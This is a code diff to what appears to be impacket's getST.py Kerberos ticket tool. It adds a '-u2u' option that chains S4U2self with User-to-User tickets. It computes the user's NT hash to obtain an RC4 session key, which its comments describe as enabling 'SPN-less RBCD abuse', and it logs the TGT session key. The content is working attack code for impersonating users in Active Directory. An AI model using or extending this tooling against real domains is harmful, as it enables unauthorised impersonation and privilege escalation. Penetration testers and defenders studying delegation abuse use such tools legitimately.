@@ -31,9 +31,15 @@
 #
 #   Once you have the ccache file, set it in the KRB5CCNAME variable and use it for fun and profit.
 #
-# Author:
+# Authors:
 #   Alberto Solino (@agsolino)
-#
+#   Charlie Bromberg (@_nwodtuhs)
+#   Martin Gallo (@MartinGalloAr)
+#   Dirk-jan Mollema (@_dirkjan)
+#   Elad Shamir (@elad_shamir)
+#   @snovvcrash
+#   Leandro (@0xdeaddood)
+#   Jake Karnes (@jakekarnes42)
 
 from __future__ import division
 from __future__ import print_function
@@ -57,7 +63,7 @@ from impacket.krb5 import constants, types, crypto, ccache
 from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
     Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
 from impacket.krb5.ccache import CCache, Credential
-from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype
+from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype, string_to_key
 from impacket.krb5.constants import TicketFlags, encodeFlags
 from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, sendReceive
 from impacket.krb5.types import Principal, KerberosTime, Ticket
@@ -449,11 +455,21 @@ class GETST:
         opts.append(constants.KDCOptions.renewable.value)
         opts.append(constants.KDCOptions.canonicalize.value)
 
+
+        if self.__options.u2u:
+            logging.info("Combining S4U2self with U2U")
+            logging.info("TGT session key: %s" % hexlify(sessionKey.contents).decode())
+            opts.append(constants.KDCOptions.renewable_ok.value)
+            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
+
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
         if self.__no_s4u2proxy and self.__options.spn is not None:
             logging.info("When doing S4U2self only, argument -spn is ignored")
-        serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+        if self.__options.u2u:
+            serverName = Principal(self.__user, self.__domain, type=constants.PrincipalNameType.NT_UNKNOWN.value)
+        else:
+            serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)
 
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         reqBody['realm'] = str(decodedTGT['crealm'])
@@ -464,6 +480,9 @@ class GETST:
         reqBody['nonce'] = random.getrandbits(31)
         seq_set_iter(reqBody, 'etype',
                      (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
+
+        if self.__options.u2u:
+            seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(TicketAsn1()),))
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Final TGS')
@@ -670,7 +689,18 @@ class GETST:
             # Still no TGT
             userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
             logging.info('Getting TGT for user')
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+            if self.__options.u2u and self.__password:
+                # 1. calculating the NT hash for the user password
+                # 2. Using it to call getKerberosTGT and obtain a ticket with an RC4_HMAC session key
+                # 3. the RC4_HMAC session key can then be used for SPN-less RBCD abuse (session key set as new password of the user between S4U2self and S4U2proxy)
+                logging.info("Requesting TGT with etype RC4")
+                self.__nthash = hexlify(string_to_key(23, self.__password, '').contents).decode()
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+                                                                        unhexlify(self.__lmhash), unhexlify(self.__nthash),
+                                                                        self.__aesKey,
+                                                                        self.__kdcHost)
+            else:
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                     unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                     self.__aesKey,
                                                                     self.__kdcHost)
@@ -722,6 +752,7 @@ if __name__ == '__main__':
     parser.add_argument('-additional-ticket', action='store', metavar='ticket.ccache', help='include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-u2u', dest='u2u', action='store_true', help='Request User-to-User ticket')
     parser.add_argument('-self', dest='no_s4u2proxy', action='store_true', help='Only do S4U2self, no S4U2proxy')
     parser.add_argument('-force-forwardable', action='store_true', help='Force the service ticket obtained through '
                                                                         'S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the '
@@ -761,6 +792,12 @@ if __name__ == '__main__':
 
     if options.additional_ticket is not None and options.impersonate is None:
         parser.error("argument -impersonate is required when doing S4U2proxy")
+
+    if options.u2u is not None and (options.no_s4u2proxy is None and options.impersonate is None):
+        parser.error("-u2u is not implemented yet without being combined to S4U. Can't obtain a plain User-to-User ticket")
+        # implementing plain u2u would need to modify the getKerberosTGS() function and add a switch
+        # in case of u2u, the proper flags should be added in the request, as well as a proper S_PRINCIPAL structure with the domain being set in order to target a UPN
+        # the request would also need to embed an additional-ticket (the target user's TGT)
 
     # Init the example's logger theme
     logger.init(options.ts)
